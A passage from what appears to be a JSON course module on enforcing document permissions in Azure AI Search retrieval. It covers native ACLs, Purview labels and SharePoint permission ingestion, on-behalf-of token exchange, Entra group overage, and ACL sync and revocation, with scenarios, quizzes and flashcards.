previews returned everything. Elevated read with a header is the debugging path.","ref":"r12"},{"id":"w07-t11-q2","type":"multi","tag":"concept","q":"Which statements about native ACL enforcement are correct? Choose all that apply.","options":["A document passes if any of userIds, groupIds or rbacScope matches","The service falls back to partial results if Microsoft Graph is down","Group membership is resolved through Graph at query time, including nested groups","Deny rules are supported in the ACL fields"],"answers":[0,2],"explain":"Matching is an OR across the three types, and Graph resolves nested membership. If Graph is down the service returns a 5xx and no partial result, and the fields list allowed ids only.","ref":"r12"},{"id":"w07-t11-q3","type":"order","tag":"order","q":"Order the steps of a native ACL query.","items":["The app sends the query with the user's Entra token in x-ms-query-source-authorization","The service checks the calling app has Search Index Data Reader","Graph resolves the user's groups, including nested ones","Documents whose ACL matches the user oid, groups or rbacScope are returned"],"explain":"The token arrives with the query, the caller role is checked, membership is expanded and only matching documents come back.","ref":"r12"}],"flashcards":[{"front":"Which header carries the user's token for native ACL queries?","back":"x-ms-query-source-authorization. For retrieve calls the token scope is https://search.azure.com/.default. Elevated read for debugging uses x-ms-enable-elevated-read."},{"front":"Native ACL limits to remember?","back":"1,000 values per userIds or groupIds field, five distinct rbacScope values per index, 32 ADLS Gen2 ACL entries and 1,000 SharePoint entries per file."},{"front":"What changed in 2025-11-01-preview?","back":"ACL filters now apply even with an API key or admin role, and a missing user token returns only public documents. Earlier previews returned everything."},{"front":"Is native ACL enforcement GA?","back":"No. As of 2026-10-13 it is preview with no SLA. The stable API 2026-04-01 does not include it."}],"related":["w07-t08","w07-t12","w07-t14","w07-t15","w07-l5"],"refs":["r11","r12","r13","r15","r17","r18","r19","tr14"]},{"id":"w07-t12","order":12,"group":"Access control options","title":"Purview sensitivity labels and SharePoint ACLs","minutes":9,"difficulty":"advanced","summary":"Preview as of 2026-10-13: Azure AI Search can enforce Purview sensitivity labels and ingest SharePoint permissions with the content. Each carries limits on link types, guests, tenants and freshness.","useIf":"Content lives in SharePoint, OneLake or Blob and access follows Microsoft 365 permissions or sensitivity labels.","avoidIf":"You need GA, support for guests and Anyone links, or multi-tenant label enforcement.","explain":[{"t":"callout","kind":"preview","title":"Preview, checked 2026-10-13","md":"Purview label enforcement and SharePoint ACL ingestion are preview features with no SLA, and the docs do not recommend previews for production [[r11]]."},{"t":"p","md":"**SharePoint ACLs.** The indexer ingests permissions with the content. It supports inheritance, unique item ACLs, Entra groups, list items, ASPX pages and SharePoint site groups (the last three from `2026-05-01-preview`, stored with an `spg:` prefix). It does not support Anyone or People in your organization links, external or guest users, or Information Management policies, and an Entra group nested inside a SharePoint group is not expanded, so those results are filtered out. It needs application permissions, not delegated, and a Basic or higher tier [[r16]]."},{"t":"p","md":"**Freshness.** From `2026-05-01-preview`, ACL changes on items with unique permissions are picked up on each successful indexer run through SharePoint change tokens. Changes on a parent scope (site, library, list or folder) are not: call `/resync` with `options: [\"permissions\"]`, or `/resetdocs` for specific keys. Earlier previews captured ACLs only at first ingestion [[r16]]."},{"t":"p","md":"**Purview labels.** Labels are extracted from Blob, ADLS Gen2, SharePoint and OneLake and gate access by classification. They need a system-assigned managed identity, single-tenant scope and RBAC auth, and are available through REST and SDK only. In a chunked index the label must be projected to every chunk row, or the chunks are not filtered. Autocomplete and Suggest are unavailable on such indexes. Retrieval can return `sensitivityLabelInfo` per reference for banners and policy checks [[r11]]. If a label applies encryption, the user needs the EXTRACT usage right as well as VIEW before an AI app returns the content [[tr13]]."},{"t":"compare","title":"Three Microsoft 365 paths","options":[{"name":"SharePoint indexer with ACLs","tag":"Preview","summary":"Copy content and permissions into the index.","pros":["Your own ranking and chunking","Inheritance and unique ACLs preserved"],"cons":["No Anyone links, guests or Information Management policies","Parent-scope changes need an explicit resync"],"bestWhen":"Sites use Entra groups and unique permissions, and revocation can wait for a resync.","avoidWhen":"Sharing links or guests drive access."},{"name":"Purview label enforcement","tag":"Preview","summary":"Gate documents by sensitivity label.","pros":["One rule for classified content","Labels shown per reference for banners"],"cons":["Single tenant, managed identity, REST and SDK only","Label must be on every chunk"],"bestWhen":"Policy is classification-based across Blob, ADLS, SharePoint and OneLake.","avoidWhen":"You need per-person access or multi-tenant labels."},{"name":"Remote SharePoint or Retrieval API","tag":"Preview billing","summary":"Let Microsoft 365 retrieve with the user's token.","pros":["Live permissions, nothing copied","Honours the source's own rules"],"cons":["200 requests per user per hour, 25 results","The caller must be known to both tenants [[r26]]"],"bestWhen":"Rules are richer than an indexer can copy.","avoidWhen":"You need your own ranking or high query volume."}]},{"t":"callout","kind":"note","title":"Names changed","md":"Microsoft Graph connectors are now Microsoft 365 Copilot connectors. They come in a synced model (content indexed into Microsoft Graph) and a federated model (MCP-based, fetched at query time with no indexing). Search for both names when you read older documents [[tr15]]."}],"whereToUse":["Assistants over SharePoint sites that use unique permissions and Entra groups","Compliance-driven corpora where sensitivity labels decide who may read","Lakehouse and Blob content classified by Purview","Surfaces that must show a classification banner next to an answer"],"whenToUse":{"use":["Access follows Microsoft 365 permissions or labels","Preview is acceptable for the stage you are in","You can run the resync jobs and monitor ACL freshness"],"avoid":["Guests, Anyone links or Information Management policies drive access","Multi-tenant label enforcement is needed","You need GA and an SLA"],"flips":["Sharing links matter: delegate retrieval to Microsoft 365 instead of copying","Revocation must be minutes: add event-driven resyncs or a live check","Only a few sites are in scope: the indexer is simple. Dozens of sites with deep nesting: plan the resync load"]},"alternatives":{"title":"Compared with its neighbours","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["SharePoint indexer ACLs","Entra groups and unique item ACLs","Links, guests, policies","Preview, resync needed for parent changes"],["Purview label enforcement","Classification-driven policy","Per-person rules, multi-tenant","Preview, label on every chunk"],["Remote SharePoint or Retrieval API","Rich rules, live permissions","Own ranking, high volume","Quotas, licensing"],["Security filters with your own export","GA needed","You do not want to maintain the export","Custom sync code"]]},"pitfalls":[{"symptom":"Chunks of a labelled document are returned to everyone","cause":"The label was set on the parent document but not projected to each chunk row","fix":"Project the label into every chunk, then test with a user without access"},{"symptom":"A folder permission change never reaches the index","cause":"Parent-scope changes are not picked up by indexer runs","fix":"Call /resync with options [\"permissions\"] on change events, plus a scheduled resync"},{"symptom":"Results disappear for users in a nested group","cause":"An Entra group nested inside a SharePoint group is not expanded","fix":"Assign the Entra group directly, or restructure the SharePoint group"},{"symptom":"A remote SharePoint query returns more than expected","cause":"An invalid KQL filter is ignored and the query runs without it","fix":"Validate filter expressions before sending [[r17]]"}],"scenarios":[{"id":"w07-t12-s1","title":"Sites shared with Anyone links and guests","situation":"Many SharePoint sites grant access through Anyone links and guest accounts. Security needs the assistant to respect those rules. Revocation within minutes is expected.","constraints":["Anyone links and guests drive access","Minutes-level revocation","Preview acceptable"],"unknowns":["Do users hold a Microsoft 365 Copilot licence?","How heavy is the query load?"],"question":"How do you enforce access?","options":[{"name":"SharePoint indexer ACLs and trust the result","verdict":"poor","why":"Anyone links, guests and Information Management policies are not supported, so access would not match SharePoint.","tradeoff":"Fine when sites use Entra groups only."},{"name":"Delegate to a remote SharePoint knowledge source or the Retrieval API with the user's token","verdict":"best","why":"SharePoint applies its own rules live, and nothing is copied [[r26]].","tradeoff":"Quotas (200 requests per user per hour), licensing and less ranking control."},{"name":"Index only sites that use Entra groups and exclude link-shared ones","verdict":"good","why":"Keeps the indexer approach safe.","tradeoff":"Link-shared content is out of scope for the assistant."}],"flips":[{"if":"Sites move to Entra-group access","then":"The indexer with ACLs becomes viable."},{"if":"Query volume exceeds the per-user quota","then":"Combine indexed content for most sites with delegation for link-shared ones."}],"takeaway":"When sharing links decide access, let the source decide."},{"id":"w07-t12-s2","title":"Classification-driven policy over a chunked index","situation":"A single-tenant company labels documents Public, General and Confidential in Purview. Content is in Blob, OneLake and SharePoint. The assistant chunks documents. The team wants one rule instead of per-document ACLs.","constraints":["Single tenant","Label-based policy","Chunked index"],"unknowns":["Is the service using a system-assigned managed identity?","Does the app show banners?"],"question":"How do you enforce the label policy?","options":[{"name":"Purview label enforcement, with the label projected into every chunk row","verdict":"best","why":"It matches a classification policy, and per-chunk labels make the filter effective [[r11]].","tradeoff":"Preview, managed identity and REST or SDK only, with no Autocomplete or Suggest."},{"name":"Label on the parent document only","verdict":"poor","why":"Chunks are not filtered without their own label.","tradeoff":"Works only when the index holds whole documents."},{"name":"Copy labels into a security filter field yourself","verdict":"good","why":"GA and under your control.","tradeoff":"You maintain the mapping and drift between labels and index."}],"flips":[{"if":"Preview is not allowed","then":"Use the security filter copy of labels."},{"if":"Labels apply encryption","then":"Users also need the EXTRACT right for AI apps to return content."}],"takeaway":"Project labels to every chunk."},{"id":"w07-t12-s3","title":"Folder permissions change at the parent","situation":"Access is managed at library and folder level. When an owner changes a folder's permissions, the index must reflect it within 15 minutes. The indexer runs every 5 minutes.","constraints":["Parent-scope changes","15-minute target","Indexer every 5 minutes"],"unknowns":["Can change events trigger a job?","How many documents sit under one folder?"],"question":"How do you meet the target?","options":[{"name":"Rely on the 5-minute indexer runs","verdict":"poor","why":"Runs pick up unique-permission item changes, not parent-scope changes [[r16]].","tradeoff":"Enough only for items with unique permissions."},{"name":"Trigger /resync with options permissions from change events, plus a scheduled resync","verdict":"best","why":"It covers parent-scope changes explicitly and the schedule catches missed events.","tradeoff":"You build the trigger and watch the resync load."},{"name":"Nightly full resync","verdict":"good","why":"Simple and complete.","tradeoff":"Up to a day of lag, so it misses 15 minutes."}],"flips":[{"if":"The target relaxes to a day","then":"The nightly resync is enough."},{"if":"Restricted folders need seconds","then":"Add a live check on those hits."}],"takeaway":"Parent-scope changes need an explicit resync."}],"quiz":[{"id":"w07-t12-q1","type":"multi","tag":"security","q":"Which are NOT supported by the SharePoint indexer's ACL ingestion? Choose all that apply.","options":["Entra groups","Anyone links","Guest or external users","Inheritance"],"answers":[1,2],"explain":"Anyone links, People in your organization links, guests and Information Management policies are not supported. Entra groups and inheritance are supported.","ref":"r16"},{"id":"w07-t12-q2","type":"single","tag":"bug","q":"A document is labelled Confidential and users without access still receive its text from a chunked index. What is the most likely cause?","options":["The managed identity is user-assigned","The label is on the parent record but was not projected to each chunk row","The index is on the Basic tier","Autocomplete is enabled"],"answer":1,"explain":"In a chunked index each chunk row needs the label or it is not filtered. A user-assigned identity prevents label ingestion altogether rather than leaking chunks, and tier or Autocomplete do not govern filtering.","ref":"r11"}],"flashcards":[{"front":"What does the SharePoint indexer's ACL support exclude?","back":"Anyone and People in your organization links, external or guest users and Information Management policies. Entra groups nested in SharePoint groups are not expanded."},{"front":"How do parent-scope SharePoint permission changes reach the index?","back":"Not through indexer runs. Call /resync with options [\"permissions\"], or /resetdocs for specific keys."},{"front":"What must you do for Purview labels on chunked indexes?","back":"Project the label onto every chunk row, or chunks are not filtered. Labels also need a system-assigned managed identity and a single tenant."}],"related":["w07-t11","w07-t10","w07-t15","w07-l5","w03-t02"],"refs":["r11","r16","r17","r26","tr13","tr15"]},{"id":"w07-t13","order":13,"group":"Identity","title":"On-behalf-of flow and retrieval identity","minutes":8,"difficulty":"core","summary":"Run retrieval as the user, not as a broad service account. In the Microsoft identity platform the on-behalf-of (OBO) flow lets a middle tier exchange the caller's token for a downstream token that carries the user's rights.","useIf":"Each caller has different rights and downstream systems (Search, Graph, a data API) must see who is asking.","avoidIf":"The job has no user, such as a scheduled batch. There you need a scoped app identity, not OBO.","explain":[{"t":"p","md":"The **retrieval identity** is the principal under which retrieval runs. A service account with broad read access plus filtering in your code is the confused-deputy shape: every user gets the service's access, and one missed filter leaks. With OBO the middle tier calls a downstream API as the user, so the downstream system enforces the user's rights itself [[r25]]."},{"t":"diagram","id":"w07-t13-d1","title":"On-behalf-of exchange","alt":"The client calls the assistant API with a token for that API. The API sends that token as an assertion to Entra ID and receives a downstream token for the same user, then calls the downstream API with it.","src":"sequenceDiagram\n  participant C as Client app\n  participant A as Assistant API\n  participant E as Entra ID\n  participant D as Downstream API\n  C->>A: Token whose audience is the assistant API\n  A->>E: assertion plus requested_token_use=on_behalf_of\n  E-->>A: Token for the downstream API, same user\n  A->>D: Call with the user's delegated token"},{"t":"p","md":"The request uses `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer`, `requested_token_use=on_behalf_of`, a `scope` for the downstream API and an `assertion` that is the access token sent to the middle tier. That token must have the middle-tier app as its audience [[r25]]. OBO uses **delegated scopes only, never app roles**, so roles stay attached to the user and never to the app acting for them."},{"t":"p","md":"Handle three details. If the downstream API enforces Conditional Access, such as MFA, the token request fails and the middle tier must return that challenge (a 401 with a `WWW-Authenticate` header) so the client can satisfy it. Never forward a middle-tier token to anything but its intended audience, and never relay it back to the client [[r25]]. In Azure AI Search native ACL queries, the user's Entra token goes in `x-ms-query-source-authorization` while the calling app needs Search Index Data Reader [[r12]]."},{"t":"callout","kind":"why","title":"Ingest and query use different identities","md":"Ingestion often runs as an app identity with read access to sources, for example SharePoint indexing needs application permissions [[r16]]. Query time must carry the user. Keep the two identities, scopes and logs separate."},{"t":"callout","kind":"note","title":"Token handling (design reasoning)","md":"Cache tokens per user and per scope, never share a cache entry between users, never log tokens, and treat any cache TTL on memberships as part of your revocation SLA."}],"whereToUse":["Assistant APIs that call Azure AI Search with native ACLs, Microsoft Graph or a line-of-business API","Systems where per-user audit trails in downstream services matter","Multi-hop agents where each tool call should carry the user's identity","Any design review that finds one service account with read access to everything"],"whenToUse":{"use":["Rights differ per user and the downstream system can enforce them","You want the downstream audit log to show the real user","You can run a confidential client as the middle tier"],"avoid":["Scheduled jobs with no user present","Downstream systems that cannot accept delegated tokens","Relaying middle-tier tokens to the browser"],"flips":["No interactive user: use a managed identity scoped to the minimum and state the audience of the output","Downstream does not support delegated tokens: map the user to a permission set yourself and enforce it in code","MFA applies downstream: surface the challenge instead of falling back to the app identity"]},"alternatives":{"title":"Retrieval identity options","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["OBO delegated token","Per-user rights, interactive flows","No user present","Token plumbing, Conditional Access handling"],["Service identity plus filter in code","Public or uniform-access content","Rights differ per user","Confused deputy, one missed filter leaks"],["Service identity plus user id passed explicitly","Downstream cannot take delegated tokens","You cannot trust the passing code path","You own the mapping and audit"],["Managed identity, scoped to the minimum","Batch jobs and ingestion","Output reaches users with different rights","Must define the output audience"]]},"pitfalls":[{"symptom":"Every user sees what the service can see","cause":"Retrieval ran under an app-only token","fix":"Use OBO or token-based enforcement and show where user identity enters the call"},{"symptom":"MFA users get empty or generic errors","cause":"The middle tier swallowed the Conditional Access challenge","fix":"Return the 401 with WWW-Authenticate so the client can step up"},{"symptom":"Tokens appear in logs or traces","cause":"Request or header logging was left on","fix":"Redact authorization headers and log principal ids only"}],"scenarios":[{"id":"w07-t13-s1","title":"Interactive assistant, different rights per user","situation":"A web assistant lets employees search documents in an index with native ACLs and in Graph. Rights differ per user and change daily. The security team wants a per-user audit trail.","constraints":["Interactive users","Per-user rights","Per-user audit"],"unknowns":["Does the API run as a confidential client?","Are all downstream APIs OBO-capable?"],"question":"Which retrieval identity do you use?","options":[{"name":"A service principal with read on everything, filtering in your code","verdict":"poor","why":"Every user then holds the service's access, and a missed filter leaks.","tradeoff":"Fits public content or a prototype with no per-user rights."},{"name":"OBO with delegated scopes, passing the user's token to Search and Graph","verdict":"best","why":"Downstream systems enforce the user's rights and log the user [[r25]].","tradeoff":"Token plumbing, Conditional Access handling and per-user token caches."},{"name":"Service principal plus the user id in a header","verdict":"good","why":"Works when the downstream cannot take delegated tokens.","tradeoff":"You enforce and audit the mapping yourself."}],"flips":[{"if":"A downstream API cannot accept delegated tokens","then":"Pass the user id explicitly and enforce in your own layer."},{"if":"Content is public","then":"A service identity is simpler and fine."}],"takeaway":"Run retrieval as the user when rights differ per user."},{"id":"w07-t13-s2","title":"Nightly summary job with no user","situation":"A scheduled job produces a daily summary of new documents for a team channel. No user is signed in. Documents come from sources with mixed permissions.","constraints":["No user present","Mixed-permission sources","Output goes to one team"],"unknowns":["Which team members may see which sources?","Can sources be restricted to what the whole channel may read?"],"question":"How should the job authenticate?","options":[{"name":"Store users' refresh tokens and run as them later","verdict":"poor","why":"Offline user impersonation widens exposure and breaks consent.","tradeoff":"Only appropriate for explicit, user-approved delegated background access."},{"name":"A managed identity limited to sources every channel member may read, with the output audience defined","verdict":"best","why":"The job's rights equal the audience's common rights, so the summary cannot reveal more than they could read.","tradeoff":"The summary omits content that only some members may see."},{"name":"A broad service principal that reads everything","verdict":"good","why":"Complete summaries.","tradeoff":"A leak risk for members who lack rights to some sources."}],"flips":[{"if":"Each reader gets a personal digest","then":"Generate it per user with their delegated access."},{"if":"All sources are visible to the whole team","then":"A broad identity is acceptable."}],"takeaway":"Without a user, scope the identity to the output audience."},{"id":"w07-t13-s3","title":"Downstream requires MFA","situation":"The assistant calls a data API that has a Conditional Access policy requiring MFA. Some users report that answers silently omit data after a policy change.","constraints":["Conditional Access downstream","Silent omission","Interactive users"],"unknowns":["What error does the token request return?","Does the client handle claims challenges?"],"question":"How do you fix it?","options":[{"name":"Return the Conditional Access challenge (401 with WWW-Authenticate) so the client can step up","verdict":"best","why":"The user can satisfy MFA and the call then runs as them [[r25]].","tradeoff":"The client must handle claims challenges."},{"name":"Catch the error and retry with the app identity","verdict":"poor","why":"It bypasses the policy and widens access.","tradeoff":"Never acceptable for user-scoped data."},{"name":"Show a generic error and ask the user to sign in again","verdict":"good","why":"Safe.","tradeoff":"Poor experience and may loop without the claims challenge."}],"flips":[{"if":"The client cannot handle challenges","then":"Redirect the user to a sign-in page that triggers MFA."},{"if":"The data does not need Conditional Access","then":"Relax the policy for that API instead of working around it."}],"takeaway":"Surface the challenge and never fall back to the app identity."}],"quiz":[{"id":"w07-t13-q1","type":"single","tag":"security","q":"Which statement about the OBO flow is correct?","options":["The middle tier receives the app roles of its own app registration for the downstream call","It uses delegated scopes only, so roles stay with the user and not the app","The token sent as the assertion can have any audience","It lets the browser reuse the middle-tier token directly"],"answer":1,"explain":"OBO exchanges the user's token for a downstream token with delegated scopes and never app roles. The assertion must have the middle-tier app as its audience, and middle-tier tokens must not be relayed to clients.","ref":"r25"},{"id":"w07-t13-q2","type":"order","tag":"order","q":"Order the OBO exchange.","items":["The client calls the assistant API with a token whose audience is that API","The API posts the token as the assertion with requested_token_use=on_behalf_of","Entra ID returns a downstream token for the same user","The API calls the downstream API with that token"],"explain":"The client token arrives first, the middle tier exchanges it at the token endpoint, receives a downstream token and uses it to call the downstream API.","ref":"r25"}],"flashcards":[{"front":"What is the retrieval identity?","back":"The principal under which retrieval runs: the caller (delegated token) or a service account. It decides what the index or source returns."},{"front":"Why does OBO use delegated scopes only?","back":"So roles stay attached to the user and never to the app acting on their behalf, which prevents a user gaining rights they should not have."},{"front":"What must the middle tier do when downstream Conditional Access demands MFA?","back":"Surface the challenge to the client (a 401 with WWW-Authenticate) so the user can step up. Never fall back to the app identity."}],"related":["w07-t14","w07-t11","w07-t18","w07-l2","w08-t11"],"refs":["r12","r16","r25"]},{"id":"w07-t14","order":14,"group":"Identity","title":"Entra groups: overage and nested groups","minutes":8,"difficulty":"advanced","summary":"A token lists at most 200 groups (JWT), so large users arrive without a groups list. Nested groups need transitive lookups. Both decide whether your ACL filter sees the user's real groups.","useIf":"Your ACLs or security filters refer to Microsoft Entra groups and some users belong to many or nested groups.","avoidIf":"Authorization is coarse and fits a few app roles. Roles avoid the overage problem.","explain":[{"t":"p","md":"A token carries at most **200 groups for a JWT, 150 for SAML and 6 for the implicit flow**. Above that the `groups` claim is replaced by an overage indicator [[r23]]. A filter built from a missing claim silently under-authorizes the user, and a careless fallback can over-authorize. Handle the claim explicitly."},{"t":"diagram","id":"w07-t14-d1","title":"Resolve groups safely","alt":"A validated token either lists groups, signals overage, or carries nothing. Overage triggers a paged Microsoft Graph transitive membership call whose result is cached with a TTL, and all paths build the filter. No groups means public documents only.","src":"flowchart TD\n  T[Validated token] --> C{groups claim present?}\n  C -- yes --> U[Use listed groups]\n  C -- \"overage marker\" --> G[Graph transitiveMemberOf, paged]\n  C -- \"nothing\" --> N[No groups: public only]\n  G --> K[Cache with TTL]\n  U --> F[Build filter]\n  K --> F\n  N --> F"},{"t":"p","md":"**Detect overage** by the absence of `groups` plus `hasgroups` (implicit flow) or `_claim_names` containing `groups`. Then call Microsoft Graph for direct and transitive memberships with `transitiveMemberOf`. Trust the presence of the overage claim, not the `_claim_sources` endpoint, which may still point at the legacy AAD Graph [[r23]]. The call pages at 100 by default and 999 at most, and advanced queries (`$count`, `$search`, `$filter`) need `ConsistencyLevel: eventual`, which reads an index that might not reflect recent changes [[r24]]."},{"t":"p","md":"**Avoid overage** instead of handling it where you can: choose *Groups assigned to the application* instead of *All groups*, or define app roles and authorize on role claims [[r23]]. For native Azure AI Search ACLs the service expands security groups and Microsoft 365 Groups through Graph at query time, so nesting works without your code [[r12]]. Whatever you cache, the TTL is part of your revocation SLA, so state it."},{"t":"callout","kind":"gotcha","title":"Fail closed","md":"If the Graph call fails or is throttled, return public documents or an error. Never build an unfiltered query."}],"whereToUse":["Security-filter designs where the filter is built from the caller's groups","Enterprise users who belong to hundreds of groups through nesting","Apps that start with the groups claim and later hit the overage limit","Choosing between groups and app roles for coarse access"],"whenToUse":{"use":["Document ACLs name Entra groups","Users can hold more than 200 groups","Groups nest more than one level"],"avoid":["Treating the groups claim as complete without checking for overage","Using an eventually consistent advanced query where fresh membership matters","Falling back to an unfiltered query when Graph fails"],"flips":["Authorization is coarse: use app roles and skip group lookups","The search service expands groups itself (native ACL, preview): drop your Graph code","Revocation needs seconds: shorten or drop the membership cache and add a live check"]},"alternatives":{"title":"Ways to get a user's groups","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["groups claim","Fewer than 200 groups, shallow nesting","Overage or nested groups","Missing or truncated list"],["Graph transitiveMemberOf per request","Overage, nesting, fresh membership","Very high volume","Latency, throttling, paging"],["Cached membership with TTL","Repeated queries, Graph load","TTL longer than the revocation target","Stale grants up to the TTL"],["App roles","Coarse authorization","Per-document group ACLs","Role design and assignment effort"],["Search service expands groups (native ACL)","Preview acceptable, Entra identities","GA needed","Preview, no SLA"]]},"pitfalls":[{"symptom":"Some users see no private documents","cause":"More than 200 groups so the groups claim was absent and the code treated it as empty","fix":"Detect the overage marker and call Graph transitiveMemberOf"},{"symptom":"Users in nested groups miss documents","cause":"Only direct memberships were read","fix":"Use transitiveMemberOf, or let native ACL enforcement expand groups"},{"symptom":"A removed member still sees documents for minutes","cause":"A membership cache TTL or an eventually consistent advanced query","fix":"Bound the TTL by the revocation target and avoid eventual-consistency queries for authorization"},{"symptom":"Graph calls fail under load","cause":"Throttling on repeated membership lookups","fix":"Cache per user, page in bulk and fail closed on errors"}],"scenarios":[{"id":"w07-t14-s1","title":"Large users, small set of ACL groups","situation":"Document ACLs reference about 30 groups. Users belong to 340 groups in total, so tokens arrive with an overage marker. Latency is tight and membership may be up to ten minutes stale.","constraints":["340 groups per user","About 30 ACL groups","Ten-minute freshness"],"unknowns":["Can the app registration be changed?","How many requests per second reach the API?"],"question":"How do you get the right groups?","options":[{"name":"Keep All groups and call Graph for every request","verdict":"poor","why":"It adds a paged Graph call to every query and risks throttling.","tradeoff":"Reasonable for rare, high-risk queries."},{"name":"Configure the token to include groups assigned to the application, mapping the ACL groups to it","verdict":"best","why":"It keeps the claim under the limit so no Graph call is needed [[r23]].","tradeoff":"Needs group assignment hygiene, and you must still detect overage as a safeguard."},{"name":"Detect overage, call transitiveMemberOf and cache the result for five minutes","verdict":"good","why":"Correct for all users and within the freshness target.","tradeoff":"Graph load, paging at 100 to 999 and a cache to secure."}],"flips":[{"if":"The ACL groups are not assignable to the app","then":"Use the Graph path with caching."},{"if":"Freshness tightens to under a minute","then":"Shorten the cache and measure Graph throttling."}],"takeaway":"Avoid overage where you can, handle it where you cannot."},{"id":"w07-t14-s2","title":"Five levels of nested groups","situation":"Document ACLs name top-level groups. Users sit in leaf groups nested up to five levels below. A removal must take effect within five minutes.","constraints":["Deep nesting","Five-minute freshness","ACLs name parent groups"],"unknowns":["Can the search service expand groups?","Is preview acceptable?"],"question":"How do you expand membership?","options":[{"name":"Read direct memberships only","verdict":"poor","why":"Users in leaf groups would miss documents that name parent groups.","tradeoff":"Fine only for flat group structures."},{"name":"transitiveMemberOf with a cache TTL under five minutes","verdict":"best","why":"It returns direct and transitive groups and fits the freshness target [[r24]].","tradeoff":"Paged Graph calls and cache management."},{"name":"Native ACL enforcement, where the search service expands groups through Graph","verdict":"good","why":"No expansion code, and failure is closed [[r12]].","tradeoff":"Preview, and your sync still limits freshness."}],"flips":[{"if":"GA is required","then":"Use transitiveMemberOf with a security filter."},{"if":"Entra identities and preview are acceptable","then":"Native ACLs remove the expansion code."}],"takeaway":"Nested groups need transitive lookups."},{"id":"w07-t14-s3","title":"Three coarse access levels","situation":"An assistant has three access levels: reader, analyst and admin. Document access depends only on the level. Users hold dozens of groups, and several hundred in some departments.","constraints":["Three levels","Coarse access","Some users exceed 200 groups"],"unknowns":["Who assigns roles?","Do per-document group ACLs exist anywhere?"],"question":"What should the app authorize on?","options":[{"name":"App roles in the token, authorize on role claims","verdict":"best","why":"Roles avoid group overage and the code reads three role names [[r23]].","tradeoff":"Role assignment must be managed, and roles do not model per-document ACLs."},{"name":"Group ids from the groups claim","verdict":"poor","why":"Large users hit overage and the code must handle it.","tradeoff":"Right when ACLs are per document and name groups."},{"name":"Graph lookups for every request","verdict":"good","why":"Always accurate.","tradeoff":"Extra latency and throttling risk for a decision three roles could make."}],"flips":[{"if":"Per-document group ACLs appear","then":"Add group resolution for those documents."},{"if":"Roles multiply into dozens","then":"Reconsider groups with a mapping layer."}],"takeaway":"Use roles for coarse access."}],"quiz":[{"id":"w07-t14-q1","type":"match","tag":"concept","q":"Match each token type to its group limit before an overage indicator replaces the list.","pairs":[{"l":"JWT","r":"200 groups"},{"l":"SAML","r":"150 groups"},{"l":"Implicit flow","r":"6 groups"}],"explain":"The thresholds are 200 for JWT, 150 for SAML and 6 for the implicit flow. Above them the groups claim is replaced by an overage indicator.","ref":"r23"},{"id":"w07-t14-q2","type":"single","tag":"diagnose","q":"A token has no groups claim but contains _claim_names listing groups. What should the API do?","options":["Treat the user as having no groups and filter to public documents silently","Call Microsoft Graph transitiveMemberOf for the user, then build the filter, failing closed if the call fails","Use the endpoint in _claim_sources exactly as given","Skip filtering to avoid blocking the user"],"answer":1,"explain":"The overage claim means a Graph lookup is needed. A silent empty list under-authorizes, the _claim_sources endpoint may point to the legacy AAD Graph, and skipping filtering leaks.","ref":"r23"}],"flashcards":[{"front":"What happens to the groups claim above the limit?","back":"It is replaced by an overage indicator: hasgroups for the implicit flow, or _claim_names containing groups. Call Graph for memberships."},{"front":"Which Graph call returns nested group memberships?","back":"GET /users/{id}/transitiveMemberOf. Page size is 100 by default and 999 at most. Advanced queries need ConsistencyLevel: eventual and may be stale."},{"front":"How can you avoid group overage?","back":"Choose Groups assigned to the application instead of All groups, or define app roles and authorize on role claims."}],"related":["w07-t13","w07-t08","w07-t11","w07-t15","w07-l2"],"refs":["r12","r23","r24"]},{"id":"w07-t15","order":15,"group":"Operations and defences","title":"ACL sync, drift and revocation","minutes":10,"difficulty":"advanced","summary":"Every copy of a permission (index, membership cache, answer cache) ages. Design how a change reaches each copy, how you detect copies that missed it, and what revocation time you promise per tier.","useIf":"Permissions live in a source system and your index, caches or membership store hold copies of them.","avoidIf":"You delegate retrieval to the source and keep no copy. Then there is nothing to sync, only a live call to rely on.","explain":[{"t":"p","md":"A revoked grant keeps working until **every** copy catches up, and each copy ages at its own rate. A pull indexer cannot beat its next run: the schedule interval ranges from 5 to 1,440 minutes [[r19]]. Push ingestion lets you patch only the ACL field with `merge`, so revocation can be seconds, but then you own the change feed. Graph driveItem notifications average under a minute and can take up to six hours, and directory subscriptions expire in under 29 days and need renewal [[r27]]. Never promise a revocation time tighter than the slowest link."},{"t":"p","md":"Start by writing a **revocation target per sensitivity tier**. Restricted data may need seconds to minutes and general internal data may accept hours. These are planning estimates, not vendor numbers. Then list every copy of a permission (index ACL field, membership cache, answer cache, search replicas) and give each one an owner, a refresh mechanism and a way to detect when it is wrong."},{"t":"table","caption":"Sync designs and their revocation floor","head":["Design","Floor","You own","Fits"],"rows":[["Scheduled pull indexer","5 to 1,440 minutes [[r19]]","Schedule, resync of parent scopes [[r16]]","General content, hours"],["Event-driven push merge","Seconds, bounded by the event feed","Change feed, retries, subscription renewal","Restricted tiers"],["Notifications plus delta reconcile","Event latency, healed by delta [[r35]]","Both paths","Large sources with missed events"],["Delegate, no copy","Live","Quotas and licences [[r26]]","Rich rules, small volume"],["Live check on top hits","Seconds, bounded by cache TTL","Latency and failure handling","Restricted hits"]]},{"t":"formula","title":"Chance a returned grant is stale","expr":"P(stale) = 1 - exp(-lambda x lag)","vars":[{"k":"lambda","v":"revocations per grant per hour: the daily revocation rate divided by 24"},{"k":"lag","v":"hours between the source change and the index"}],"example":"At 5% revocations a day and 24 hours of lag, P(stale) is about **4.9%** per returned grant, and with 10 hits about 39% of queries include a revoked document. At 1% a day and 1 hour of lag it is about 0.04% per grant, or about 0.4% of queries. Source: the lab model in the ACL decision space topic, a teaching simplification."},{"t":"flow","title":"A drift-detection loop (design reasoning)","direction":"h","steps":[{"title":"Sample","md":"Pick documents daily, weighted to restricted tiers.","tag":"daily"},{"title":"Compare","md":"Read the source ACL and the index ACL for each.","tag":"diff"},{"title":"Alert and contain","md":"On any mismatch, alert and hide the document until fixed.","tag":"fail closed"},{"title":"Track age","md":"Chart the age of the oldest unsynced change.","tag":"SLO"}]},{"t":"callout","kind":"gotcha","title":"Revocation includes deletes and caches","md":"Deleted source items must disappear from the index and from answer, semantic and membership caches. Test deletes, not only permission edits, with a canary document."}],"whereToUse":["Setting a revocation target per sensitivity tier before building sync","SharePoint or lake content indexed on a schedule with permission 